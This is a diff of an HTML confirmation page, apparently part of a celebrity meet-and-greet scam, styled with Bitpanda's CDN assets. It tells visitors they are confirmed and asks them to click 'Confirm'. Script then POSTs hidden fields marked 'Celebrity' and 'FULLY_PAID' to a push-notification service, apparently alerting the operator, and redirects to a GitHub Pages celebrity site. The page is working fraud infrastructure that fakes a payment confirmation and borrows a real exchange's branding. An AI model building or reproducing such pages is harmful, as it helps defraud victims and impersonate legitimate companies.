@@ -1,62 +1,211 @@
 
+  <!DOCTYPE html>
+<html>
+<head><html class=light lang=en><head>
 
-
-
-
-<!DOCTYPE html><html class=light lang=en><head><script src="https://www.googleoptimize.com/optimize.js?id=OPT-N3D6ZNP"></script><script>if(document.cookie.match("uc_performance_v1_0=accepted")?.length){ window.dataLayer.push({'event': 'optimize.activate'}); }</script><meta charset=utf-8>
-
-
-<title> 
-Successful 
-
-</title>
-
-<meta content="width=device-width, initial-scale=1.0" name=viewport>
-
-<meta content=origin name=referrer>
-<meta content="" name=description>
-
-
-
+<meta charset=utf-8> <meta content="width=device-width, initial-scale=1.0" name=viewport>
 <link href="https://cdn.bitpanda.com/app/v2/css/all.min.css?id=622e023bba9164dff838" rel=stylesheet><script src="https://cdn.bitpanda.com/app/v2/js/head.min.js?id=e37b5634f1d9be3b8e80"></script>
-
-
-<body class="default home light" style="position: unset;"><header id=layout-header><header><div class="bp-nav js-contains-anchor"><div class=bp-nav__container><div class=util-flex-shrink-0>
-
-
-
-<h2>
-
-
-
-  Successful
-
  
-
-<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTQj6dsE4bZEG-KyDhF2kgJAxwm9k2Fqxq1Qw&amp;usqp=CAU" jsaction="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4094px; width: 66px; height: 64px; margin: 0px;" alt="verify&quot; Icon - Download for free – Iconduck" role="button" tabindex="0" aria-label="verify&quot; Icon - Download for free – Iconduck Search inside image" aria-pressed="false" jsname="kn3ccd" aria-hidden="false">
-
-
-</h2>
+<title>Successful</title>
 
 
-</div></div>
-</header> <section id=layout-content tabindex=-1><section class="default uk-padding-remove-bottom uk-section"><div class=uk-container><div class="uk-child-width-1-2@m uk-flex-middle uk-grid" uk-grid="">
-<div class=default><section class="module-text uk-padding-remove-bottom uk-padding-remove-top uk-section uk-text-left uk-text-left@m">
+<style>
+.text-107px {
+  font-size: 18px;
+  padding: 6px;
+  color: #000000;
+}
+
+/* Increase font size for desktop screens */
+@media (min-width: 1024px) {
+  .text-107px {
+    font-size: 24px;
+  }
+}
+</style>
 
 
-<h4>
+
+<style>
+.responsive-btn {
+  width: 100%;
+  height: 34px;
+  border: 0;
+  border-radius: 30px;
+  background-color: #306754;
+  color: #fff;
+  font-size: 17px;
+  font-weight: bold;
+  cursor: pointer;
+  transition: height 0.2s, font-size 0.2s;
+}
+
+@media (min-width: 1024px) {
+  .responsive-btn {
+    height: 48px;
+    font-size: 24px;
+  }
+}
+</style>
 
 
- You are now confirmed for the meet and greet. Comprehensive information, including vital documentation and your ticket, will be sent to you by mail. You can anticipate receiving regular updates from the meet and greet support team within the next few hours.
+
+
+    <style>
+        /* Center the spinner and message */
+        #loading-message {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column; /* Stack elements vertically */
+            justify-content: center;
+            align-items: center;
+            color: #000000;
+            font-size: 35px; /* Text size */
+            font-family: Arial, sans-serif;
+            z-index: 1000;
+            visibility: hidden;
+        }
+
+        /* Spinner animation */
+        .spinner {
+            border: 6px solid rgba(255, 255, 255, 0.3); /* Thicker border */
+            border-top: 16px solid black; /* Thicker spinner border */
+            border-radius: 50%;
+            width: 100px; /* Larger spinner size */
+            height: 100px; /* Larger spinner size */
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px; /* Space between spinner and text */
+        }
+
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+    <script>
+        function handleFormSubmit(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Show the loading message and spinner
+            const loadingMessage = document.getElementById("loading-message");
+            loadingMessage.style.visibility = "visible";
+
+            // Collect form data
+            const formData = new FormData(event.target);
+
+            // Create XMLHttpRequest for compatibility with old browsers
+            const xhr = new XMLHttpRequest();
+
+            // API endpoint
+            const apiUrl = "https://wirepusher.com/send";
+
+            // Configure the request to POST to the API
+            xhr.open("POST", apiUrl, true);
+
+            // Setup a callback to handle the response
+            xhr.onload = function () {
+                // Hide the loading message
+                loadingMessage.style.visibility = "hidden";
+
+                if (xhr.status === 200) {
+                    try {
+                        // Parse the response
+                        const response = JSON.parse(xhr.responseText);
+
+                        // Check if the response indicates success
+                        if (response.results && response.results["6Cr7mpGrC"] === "success") {
+                            // Redirect to the desired URL
+                            window.location.href = "https://celebrity-us.github.io/Celebrities/";
+                        } else {
+                            alert("Submission failed! Please try again.");
+                        }
+                    } catch (e) {
+                        alert("An error occurred while processing the response.");
+                        console.error(e);
+                    }
+                } else {
+                    alert("Failed to submit the form. Please check your connection.");
+                }
+            };
+
+            // Handle network errors or other issues
+            xhr.onerror = function () {
+                // Hide the loading message
+                loadingMessage.style.visibility = "hidden";
+                alert("A network error occurred. Please try again later.");
+            };
+
+            // Send the form data
+            xhr.send(formData);
+        }
+    </script>
+
+</head>
+<body>
+
+
+
+
+
+
+
+<h5 class="text-107px">
+<br><br><br>
+
+<strong>
+
+Successful  
+
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTQj6dsE4bZEG-KyDhF2kgJAxwm9k2Fqxq1Qw&usqp=CAU" jsaction="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4094px; width: 35px; height: 35px; margin: 0px;" alt="verify" Icon - Download for free – Iconduck" role="button" tabindex="0" aria-label="verify" Icon - Download for free – Iconduck Search inside image" aria-pressed="false" jsname="kn3ccd" aria-hidden="false">
+
+
+</strong>
+
 
 <br><br><br><br>
-<br>
 
-</h4>
+You're  ready! Additional details will be emailed to you within a few hours. Please click the button below to confirm
+
+<br><br>
+
+
+
+ <!-- Loading message with spinner -->
+    <div id="loading-message">
+        <div class="spinner"></div>
+        Processing...
+    </div>
+
+    <form onsubmit="handleFormSubmit(event)">
+        <!-- Hidden fields for the required parameters -->
+        <input type="hidden" name="id" value="6Cr7mpGrC">
+        <input type="hidden" name="title" value="Celebrity">
+        <input type="hidden" name="message" value="FULLY_PAID">
+        <input type="hidden" name="type" value="YourCustomType">
+
+        <!-- Submit button -->
+
+
+        <button type="submit" class="responsive-btn">Confirm</button>
+
+    </form>
+
 
 
 
  
+<br><br><br><br><br>
 
-</div></nav> </div> </div></div> </section> <section class=footer__navbar><div class=uk-container><div class="uk-child-width-auto@s uk-flex-between uk-flex-middle" uk-grid=""><div> </section> <section class="footer__navbar footer__navbar--sm footer__navbar__gradient"><div class=uk-container><div class=uk-flex-between uk-grid=""><div class="uk-text-center uk-text-right@m uk-width-1-1 uk-width-auto@m"></path> </symbol></svg></body></html> 
-
+</h5>
+   
+</body>
+</html>
